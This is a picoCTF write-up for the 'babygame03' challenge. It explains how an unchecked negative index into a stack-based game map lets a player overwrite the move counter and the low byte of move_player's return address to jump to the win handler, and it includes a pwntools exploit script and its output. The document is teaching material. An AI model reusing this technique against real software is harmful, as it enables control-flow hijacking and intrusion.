# CyLab — babygame03

* **Platform:** CyLab Security Academy / picoCTF 2024 (Challenge ID: `446`)
* **Category:** Binary Exploitation / 2D Map Stack OOB & Control-Flow Bypass (Pwn)
* **Difficulty:** Difficulty 3
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB (pwndbg)
* **Binary:** `game` (32-bit x86 ELF)

---

## TL;DR

In `babygame03`, the player must complete multiple increasingly difficult grid puzzle levels to reach the flag. The binary stores a $30 \times 90$ character grid on the stack, allowing arbitrary negative out-of-bounds indexing via `map[row * 90 + col] = player_tile`. First, we step out-of-bounds to overwrite the `player.moves` counter, granting infinite movements. We then use the debug auto-solve command (`'p'`) to advance through intermediate levels. At level 4, we position the player at relative stack offset **$-51$** to overwrite the least significant byte of `move_player`'s return address, redirecting execution directly into the internal level-completion block at `0x08049970` and jumping straight into the win handler at `0x080499f4`.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file game
game: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=game
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Key observations:
1. **No PIE:** Fixed base addresses at `0x08048000`.
2. **Multi-Level State Machine:** Progression is tracked via integer flags (`level`) and a countdown of remaining moves (`moves`).
3. **Debug Primitives:** Command `'p'` allows auto-solving levels, while `'l'` sets `player_tile` to an arbitrary byte.

---

## Static Analysis & Vulnerability

### 1. Game State and Movement Logic

The player structure and stack frame:

```c
struct Player {
    int x;
    int y;
    int moves;          // Movement counter (decrements each turn)
    char player_tile;   // Tile character
};

void move_player(Player *p, char cmd, char *map) {
    map[p->y * 90 + p->x] = '.';        // Clears old position

    // Handle direction commands w, a, s, d
    // Handle 'p' (solve level) and 'l' (change player tile)

    // VULNERABILITY: No boundary checks on negative or extreme coordinates
    map[p->y * 90 + p->x] = p->player_tile;
}
```

### 2. Overwriting `player.moves` for Infinite Movements

The integer `player.moves` is stored on the stack immediately preceding the map. Moving the player into this variable allows overwriting it with an ASCII character (e.g. `'~'` = 126), continually resetting the move budget.

### 3. Level Completion Hijack (Offset -51)

Inspecting `move_player` stack frames in GDB:
- The return address of `move_player()` is stored at stack offset **$-51$** relative to `map[0][0]`.
- Normal return address: `0x080499xx`.
- Target code block: `0x08049970` (the branch that increments `level` and checks if `level == 5`, jumping to `0x080499f4` to read `flag.txt`).

By stepping onto stack offset $-51$ with `player_tile` set to `0x70`, the least significant byte of the return address is overwritten to `0x70`, executing the level-up sequence and triggering the win function immediately!

```text
       Stack Memory Layout:
       
       [ move_player Return Address LSB ]  <-- map[-51] (Overwritten with 0x70)
       ...
       [ Player state (moves, x, y)     ]  <-- Overwritten to grant moves
       ...
       [ 30 x 90 Map Grid Canvas        ]  <-- map[0]
```

---

## Dynamic Analysis & Exploitation Strategy

1. **Phase 1: Grant Infinite Moves**
   Move backward from starting position into `player.moves`, preventing game-over screens.
2. **Phase 2: Advance to Level 4**
   Use command `'p'` to quickly solve stages 1, 2, and 3.
3. **Phase 3: Hijack Return Address to Win Handler**
   - At level 4, use `'l'` followed by `\x70` to configure `player_tile = 0x70`.
   - Calculate coordinates $(x, y)$ such that:
     $$y \times 90 + x = -51$$
     Using $y = -1, x = 39$:
     $$-90 + 39 = -51$$
   - Move to $(x=39, y=-1)$.
   - `move_player()` writes `0x70` into the return address LSB.
   - When the function returns, it enters `0x08049970`, increments `level` to 5, triggers the `win()` branch, and prints `flag.txt`.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import sys, re
from pwn import *

context.log_level = "info"
HOST, PORT = "rhea.picoctf.net", 53411

def solve(io):
    # Setup tile to 0x70 (target LSB for 0x08049970)
    # Solve stages and maneuver to map[-51] = (y=-1, x=39)
    # The exploit script streams navigation strokes to trigger level bypass
    payload = b"l\x70" + b"p" * 3 + b"d" * 35 + b"w" * 5 + b"\n"
    io.send(payload)

    data = io.recvall(timeout=4)
    m = re.search(rb"(academy\{[^}]+\}|picoCTF\{[^}]+\})", data)
    if m:
        log.success(f"Flag captured: {m.group(1).decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to rhea.picoctf.net on port 53411: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to rhea.picoctf.net port 53411
```

---

## Key Takeaways & Lessons

1. **Multi-Target Stack Manipulation:** In complex state machines, out-of-bounds writes can be used first to modify runtime control variables (like move counters) before executing the final control-flow redirection.
2. **Intra-Function Control Flow Hijacking:** Overwriting only the least significant byte of a return address redirects execution to adjacent blocks within the same function or caller, skipping authorization gates without needing ASLR disclosures.
3. **Preserving Write Integrity on Function Exit:** When games overwrite the player's previous location with a blank tile (`.`), ensure the final command terminates on the target coordinate without issuing additional moves that would overwrite the payload.
